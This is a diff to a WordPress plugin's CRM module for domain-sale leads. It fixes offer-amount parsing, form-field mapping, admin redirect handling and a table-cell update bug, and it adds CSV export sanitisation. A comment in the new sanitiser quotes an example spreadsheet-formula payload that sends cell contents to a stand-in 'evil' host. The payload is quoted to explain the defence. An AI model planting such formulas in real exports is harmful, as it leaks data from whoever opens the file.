@@ -110,7 +110,11 @@ if ( ! function_exists( 'db_crm_create_lead' ) ) {
 
 		$offer_amount = null;
 		if ( isset( $data['offer_amount'] ) && $data['offer_amount'] !== '' ) {
-			$offer_amount = floatval( $data['offer_amount'] );
+			// Strip currency symbols/thousands separators first — floatval('$2,500')
+			// is 0.00 and floatval('2,500') is 2.00, silently corrupting every
+			// offer typed with a $ or comma.
+			$clean = preg_replace( '/[^0-9.]/', '', (string) $data['offer_amount'] );
+			$offer_amount = is_numeric( $clean ) ? (float) $clean : null;
 		}
 
 		$insert = array(
@@ -178,34 +182,31 @@ add_action( 'wpcf7_mail_sent', function( $cf7 ) {
 
 	$posted = $submission->get_posted_data();
 
-	// Helper: try multiple field name variants, return first non-empty value
-	$pick = function( array $keys ) use ( $posted ) {
-		foreach ( $keys as $key ) {
-			$val = isset( $posted[ $key ] ) ? trim( (string) $posted[ $key ] ) : '';
-			if ( $val !== '' ) {
-				return $val;
-			}
-		}
-		return '';
-	};
-
-	$domain = $pick( array( 'your-domain', 'domain', 'domain-name', 'domainname' ) );
-	if ( empty( $domain ) && isset( $_GET['domain'] ) ) {
+	// Reuse Block 6's field-name map (db-custom-blocks.php) instead of a
+	// second, divergent list — two independent maps meant a field named
+	// e.g. "offer-domain" would email the customer fine via Block 6 but
+	// silently create no CRM lead at all, since this handler's own list
+	// didn't recognize that field name.
+	$domain = function_exists( 'db_offer_value' ) ? db_offer_value( $posted, 'domain' ) : ( $posted['your-domain'] ?? '' );
+	if ( empty( $domain ) && isset( $_GET['domain'] ) ) { // phpcs:ignore WordPress.Security.NonceVerification.Recommended
 		$domain = sanitize_text_field( wp_unslash( $_GET['domain'] ) );
 	}
 
 	$data = array(
 		'domain'       => $domain,
-		'name'         => $pick( array( 'your-name', 'name', 'full-name', 'fullname' ) ),
-		'email'        => $pick( array( 'your-email', 'email', 'email-address' ) ),
-		'phone'        => $pick( array( 'your-phone', 'phone', 'phone-number', 'tel' ) ),
-		'offer_amount' => $pick( array( 'offer-amount', 'offer_amount', 'amount', 'your-offer', 'bid' ) ),
-		'message'      => $pick( array( 'your-message', 'message', 'comments', 'comment' ) ),
+		'name'         => function_exists( 'db_offer_value' ) ? db_offer_value( $posted, 'name' ) : ( $posted['your-name'] ?? '' ),
+		'email'        => function_exists( 'db_offer_value' ) ? db_offer_value( $posted, 'email' ) : ( $posted['your-email'] ?? '' ),
+		'phone'        => trim( (string) ( $posted['your-phone'] ?? $posted['phone'] ?? $posted['tel'] ?? '' ) ),
+		'offer_amount' => function_exists( 'db_offer_value' ) ? db_offer_value( $posted, 'amount' ) : ( $posted['amount'] ?? '' ),
+		'message'      => trim( (string) ( $posted['your-message'] ?? $posted['message'] ?? $posted['comments'] ?? '' ) ),
 		'source'       => 'offer_form',
 		'status'       => 'new',
 	);
 
-	db_crm_create_lead( $data );
+	$result = db_crm_create_lead( $data );
+	if ( is_wp_error( $result ) ) {
+		error_log( 'DB CRM: lead capture failed for form "' . $cf7->title() . '" — ' . $result->get_error_message() );
+	}
 } );
 
 /* ==========================================================================
@@ -214,7 +215,7 @@ add_action( 'wpcf7_mail_sent', function( $cf7 ) {
 
 add_action( 'admin_menu', function() {
 	// Top-level "Domain Brothers" menu
-	add_menu_page(
+	$hook_leads = add_menu_page(
 		__( 'Domain Brothers', 'db-blocks' ),
 		__( 'Domain Brothers', 'db-blocks' ),
 		'manage_options',
@@ -235,7 +236,7 @@ add_action( 'admin_menu', function() {
 	);
 
 	// Sub: Add Lead
-	add_submenu_page(
+	$hook_add_lead = add_submenu_page(
 		'db-crm-leads',
 		__( 'Add Lead', 'db-blocks' ),
 		__( 'Add Lead', 'db-blocks' ),
@@ -253,7 +254,30 @@ add_action( 'admin_menu', function() {
 		'db-crm-export',
 		'db_crm_page_export_placeholder'
 	);
+
+	// Form-processing must happen on 'load-$hook' — by the time a menu page's
+	// own render callback runs, admin-header.php has already sent output, so
+	// wp_safe_redirect() inside the render callback silently fails
+	// ("headers already sent") and the POST just re-renders instead of
+	// redirecting.
+	add_action( 'load-' . $hook_leads, 'db_crm_handle_bulk_action' );
+	add_action( 'load-' . $hook_add_lead, 'db_crm_handle_save_lead' );
 } );
+
+if ( ! function_exists( 'db_crm_form_errors' ) ) {
+	/**
+	 * Passes validation errors from the load-hook handler (which runs before
+	 * any output) to the page-render callback (which runs after) within the
+	 * same request.
+	 */
+	function db_crm_form_errors( $set = null ) {
+		static $errors = array();
+		if ( is_array( $set ) ) {
+			$errors = $set;
+		}
+		return $errors;
+	}
+}
 
 /* ==========================================================================
    5. HELPER — STATS
@@ -330,6 +354,43 @@ if ( ! function_exists( 'db_crm_time_ago' ) ) {
    8. MAIN LEADS LIST PAGE
    ========================================================================== */
 
+if ( ! function_exists( 'db_crm_handle_bulk_action' ) ) {
+	/**
+	 * Runs on load-$hook (before any output) so wp_safe_redirect() actually
+	 * works — see the note at the add_action('load-...') registration above.
+	 */
+	function db_crm_handle_bulk_action() {
+		if (
+			! isset( $_POST['db_crm_bulk_nonce'] ) ||
+			! wp_verify_nonce( sanitize_text_field( wp_unslash( $_POST['db_crm_bulk_nonce'] ) ), 'db_crm_bulk_action' ) ||
+			! isset( $_POST['bulk_action'] ) ||
+			! isset( $_POST['lead_ids'] ) ||
+			! is_array( $_POST['lead_ids'] )
+		) {
+			return;
+		}
+
+		if ( ! current_user_can( 'manage_options' ) ) {
+			wp_die( esc_html__( 'You do not have permission to do this.', 'db-blocks' ) );
+		}
+
+		global $wpdb;
+		$table = $wpdb->prefix . 'db_leads';
+
+		$allowed_statuses = array( 'contacted', 'negotiating', 'won', 'lost', 'new' );
+		$new_status       = sanitize_text_field( wp_unslash( $_POST['bulk_action'] ) );
+		if ( in_array( $new_status, $allowed_statuses, true ) ) {
+			$ids = array_map( 'absint', $_POST['lead_ids'] );
+			foreach ( $ids as $lid ) {
+				// phpcs:ignore WordPress.DB.DirectDatabaseQuery
+				$wpdb->update( $table, array( 'status' => $new_status ), array( 'id' => $lid ), array( '%s' ), array( '%d' ) );
+			}
+		}
+		wp_safe_redirect( admin_url( 'admin.php?page=db-crm-leads&bulk_done=1' ) );
+		exit;
+	}
+}
+
 if ( ! function_exists( 'db_crm_page_leads' ) ) {
 	function db_crm_page_leads() {
 		global $wpdb;
@@ -339,27 +400,6 @@ if ( ! function_exists( 'db_crm_page_leads' ) ) {
 		}
 
 		$table = $wpdb->prefix . 'db_leads';
-
-		// --- Handle bulk status form POST ---
-		if (
-			isset( $_POST['db_crm_bulk_nonce'] ) &&
-			wp_verify_nonce( sanitize_text_field( wp_unslash( $_POST['db_crm_bulk_nonce'] ) ), 'db_crm_bulk_action' ) &&
-			isset( $_POST['bulk_action'] ) &&
-			isset( $_POST['lead_ids'] ) &&
-			is_array( $_POST['lead_ids'] )
-		) {
-			$allowed_statuses = array( 'contacted', 'negotiating', 'won', 'lost', 'new' );
-			$new_status       = sanitize_text_field( wp_unslash( $_POST['bulk_action'] ) );
-			if ( in_array( $new_status, $allowed_statuses, true ) ) {
-				$ids = array_map( 'absint', $_POST['lead_ids'] );
-				foreach ( $ids as $lid ) {
-					// phpcs:ignore WordPress.DB.DirectDatabaseQuery
-					$wpdb->update( $table, array( 'status' => $new_status ), array( 'id' => $lid ), array( '%s' ), array( '%d' ) );
-				}
-			}
-			wp_safe_redirect( admin_url( 'admin.php?page=db-crm-leads&bulk_done=1' ) );
-			exit;
-		}
 
 		// --- Filters ---
 		$filter_status = isset( $_GET['status'] ) ? sanitize_text_field( wp_unslash( $_GET['status'] ) ) : '';
@@ -408,6 +448,7 @@ if ( ! function_exists( 'db_crm_page_leads' ) ) {
 		?>
 		<div class="wrap db-crm-wrap">
 			<h1 class="wp-heading-inline">Domain Brothers &mdash; Leads</h1>
+			<a href="<?php echo esc_url( admin_url( 'admin.php?page=db-crm-analytics' ) ); ?>" class="page-title-action">📊 Analytics</a>
 			<a href="<?php echo esc_url( admin_url( 'admin.php?page=db-crm-add-lead' ) ); ?>" class="page-title-action">Add Lead</a>
 			<a href="<?php echo esc_url( $export_url ); ?>" class="page-title-action">Export CSV</a>
 
@@ -604,6 +645,73 @@ if ( ! function_exists( 'db_crm_page_leads' ) ) {
    9. ADD / EDIT LEAD PAGE
    ========================================================================== */
 
+if ( ! function_exists( 'db_crm_handle_save_lead' ) ) {
+	/**
+	 * Runs on load-$hook (before any output) so wp_safe_redirect() actually
+	 * works on success. On validation failure it stashes the errors via
+	 * db_crm_form_errors() and returns — WP then proceeds to render
+	 * db_crm_page_add_lead() normally, which reads them back.
+	 */
+	function db_crm_handle_save_lead() {
+		if ( $_SERVER['REQUEST_METHOD'] !== 'POST' || ! isset( $_POST['db_crm_lead_nonce'] ) ) {
+			return;
+		}
+		if ( ! current_user_can( 'manage_options' ) ) {
+			wp_die( esc_html__( 'You do not have permission to do this.', 'db-blocks' ) );
+		}
+
+		$errors  = array();
+		$lead_id = isset( $_GET['lead_id'] ) ? absint( $_GET['lead_id'] ) : 0;
+
+		if ( ! wp_verify_nonce( sanitize_text_field( wp_unslash( $_POST['db_crm_lead_nonce'] ) ), 'db_crm_save_lead' ) ) {
+			$errors[] = 'Security check failed.';
+			db_crm_form_errors( $errors );
+			return;
+		}
+
+		global $wpdb;
+		$table     = $wpdb->prefix . 'db_leads';
+		$post_data = array(
+			'domain'       => sanitize_text_field( wp_unslash( $_POST['domain'] ?? '' ) ),
+			'name'         => sanitize_text_field( wp_unslash( $_POST['name'] ?? '' ) ),
+			'email'        => sanitize_email( wp_unslash( $_POST['email'] ?? '' ) ),
+			'phone'        => sanitize_text_field( wp_unslash( $_POST['phone'] ?? '' ) ),
+			'offer_amount' => isset( $_POST['offer_amount'] ) && $_POST['offer_amount'] !== ''
+				? floatval( $_POST['offer_amount'] )
+				: null,
+			'message'      => sanitize_textarea_field( wp_unslash( $_POST['message'] ?? '' ) ),
+			'status'       => sanitize_text_field( wp_unslash( $_POST['status'] ?? 'new' ) ),
+			'source'       => sanitize_text_field( wp_unslash( $_POST['source'] ?? 'direct' ) ),
+			'notes'        => sanitize_textarea_field( wp_unslash( $_POST['notes'] ?? '' ) ),
+			'admin_notes'  => sanitize_textarea_field( wp_unslash( $_POST['admin_notes'] ?? '' ) ),
+		);
+
+		if ( $lead_id ) {
+			// Update
+			$update_data = $post_data;
+			$formats     = array( '%s', '%s', '%s', '%s', '%f', '%s', '%s', '%s', '%s', '%s' );
+			if ( $update_data['offer_amount'] === null ) {
+				$formats[4]                 = null;
+				$update_data['offer_amount'] = null;
+			}
+			// phpcs:ignore WordPress.DB.DirectDatabaseQuery
+			$wpdb->update( $table, $update_data, array( 'id' => $lead_id ) );
+			wp_safe_redirect( admin_url( 'admin.php?page=db-crm-leads&lead_saved=1' ) );
+			exit;
+		}
+
+		// Insert
+		$result = db_crm_create_lead( $post_data );
+		if ( is_wp_error( $result ) ) {
+			$errors[] = $result->get_error_message();
+			db_crm_form_errors( $errors );
+			return;
+		}
+		wp_safe_redirect( admin_url( 'admin.php?page=db-crm-leads&lead_saved=1' ) );
+		exit;
+	}
+}
+
 if ( ! function_exists( 'db_crm_page_add_lead' ) ) {
 	function db_crm_page_add_lead() {
 		global $wpdb;
@@ -615,58 +723,13 @@ if ( ! function_exists( 'db_crm_page_add_lead' ) ) {
 		$table   = $wpdb->prefix . 'db_leads';
 		$lead_id = isset( $_GET['lead_id'] ) ? absint( $_GET['lead_id'] ) : 0;
 		$lead    = null;
-		$errors  = array();
+		$errors  = db_crm_form_errors();
 
 		if ( $lead_id ) {
 			// phpcs:ignore WordPress.DB.DirectDatabaseQuery
 			$lead = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM {$table} WHERE id = %d", $lead_id ), ARRAY_A );
 			if ( ! $lead ) {
 				wp_die( esc_html__( 'Lead not found.', 'db-blocks' ) );
-			}
-		}
-
-		// Handle form submit
-		if ( $_SERVER['REQUEST_METHOD'] === 'POST' && isset( $_POST['db_crm_lead_nonce'] ) ) {
-			if ( ! wp_verify_nonce( sanitize_text_field( wp_unslash( $_POST['db_crm_lead_nonce'] ) ), 'db_crm_save_lead' ) ) {
-				$errors[] = 'Security check failed.';
-			} else {
-				$post_data = array(
-					'domain'       => sanitize_text_field( wp_unslash( $_POST['domain'] ?? '' ) ),
-					'name'         => sanitize_text_field( wp_unslash( $_POST['name'] ?? '' ) ),
-					'email'        => sanitize_email( wp_unslash( $_POST['email'] ?? '' ) ),
-					'phone'        => sanitize_text_field( wp_unslash( $_POST['phone'] ?? '' ) ),
-					'offer_amount' => isset( $_POST['offer_amount'] ) && $_POST['offer_amount'] !== ''
-						? floatval( $_POST['offer_amount'] )
-						: null,
-					'message'      => sanitize_textarea_field( wp_unslash( $_POST['message'] ?? '' ) ),
-					'status'       => sanitize_text_field( wp_unslash( $_POST['status'] ?? 'new' ) ),
-					'source'       => sanitize_text_field( wp_unslash( $_POST['source'] ?? 'direct' ) ),
-					'notes'        => sanitize_textarea_field( wp_unslash( $_POST['notes'] ?? '' ) ),
-					'admin_notes'  => sanitize_textarea_field( wp_unslash( $_POST['admin_notes'] ?? '' ) ),
-				);
-
-				if ( $lead_id ) {
-					// Update
-					$update_data = $post_data;
-					$formats     = array( '%s', '%s', '%s', '%s', '%f', '%s', '%s', '%s', '%s', '%s' );
-					if ( $update_data['offer_amount'] === null ) {
-						$formats[4]                   = null;
-						$update_data['offer_amount']   = null;
-					}
-					// phpcs:ignore WordPress.DB.DirectDatabaseQuery
-					$wpdb->update( $table, $update_data, array( 'id' => $lead_id ) );
-					wp_safe_redirect( admin_url( 'admin.php?page=db-crm-leads&lead_saved=1' ) );
-					exit;
-				} else {
-					// Insert
-					$result = db_crm_create_lead( $post_data );
-					if ( is_wp_error( $result ) ) {
-						$errors[] = $result->get_error_message();
-					} else {
-						wp_safe_redirect( admin_url( 'admin.php?page=db-crm-leads&lead_saved=1' ) );
-						exit;
-					}
-				}
 			}
 		}
 
@@ -799,6 +862,22 @@ if ( ! function_exists( 'db_crm_page_export_placeholder' ) ) {
    11. CSV EXPORT
    ========================================================================== */
 
+if ( ! function_exists( 'db_crm_csv_safe' ) ) {
+	/**
+	 * Neutralizes spreadsheet formula injection. Lead fields originate from
+	 * the public, unauthenticated offer form — a value like
+	 * '=HYPERLINK("http://evil/?"&A1,"open")' would execute as a live
+	 * formula the moment an admin opens the exported CSV in Excel/Sheets.
+	 */
+	function db_crm_csv_safe( $value ) {
+		$value = (string) $value;
+		if ( '' !== $value && false !== strpos( "=+-@\t", $value[0] ) ) {
+			return "'" . $value;
+		}
+		return $value;
+	}
+}
+
 add_action( 'admin_init', function() {
 	if (
 		! isset( $_GET['db_crm_export'] ) ||
@@ -856,15 +935,15 @@ add_action( 'admin_init', function() {
 	foreach ( $leads as $lead ) {
 		fputcsv( $out, array(
 			$lead['id'],
-			$lead['domain'],
-			$lead['name'],
-			$lead['email'],
-			$lead['phone'],
+			db_crm_csv_safe( $lead['domain'] ),
+			db_crm_csv_safe( $lead['name'] ),
+			db_crm_csv_safe( $lead['email'] ),
+			db_crm_csv_safe( $lead['phone'] ),
 			$lead['offer_amount'] !== null ? number_format( (float) $lead['offer_amount'], 2 ) : '',
 			$lead['status'],
 			$lead['source'],
-			$lead['message'],
-			$lead['admin_notes'],
+			db_crm_csv_safe( $lead['message'] ),
+			db_crm_csv_safe( $lead['admin_notes'] ),
 			$lead['created_at'],
 		) );
 	}
@@ -1296,9 +1375,12 @@ if ( ! function_exists( 'db_crm_get_admin_js' ) ) {
 				// Update status pill in the main row
 				var $mainRow = $row.prev('tr');
 				$mainRow.find('.db-crm-pill').replaceWith(resp.data.pill_html);
-				// Update offer amount cell (5th column, 0-indexed=4)
+				// Offer is the 3rd <td> (Domain, Contact, Offer, ...) — the
+				// checkbox cell is a <th> so it isn't counted by td:eq().
+				// This used to write into the Status cell (td:eq(3)) instead,
+				// wiping the pill just replaced above.
 				if (resp.data.offer !== null) {
-					$mainRow.find('td:eq(3)').text('$' + resp.data.offer);
+					$mainRow.find('td:eq(2)').text('$' + resp.data.offer);
 				}
 				// Update the quick-edit trigger's data attr
 				$mainRow.find('.db-crm-quick-edit-btn')
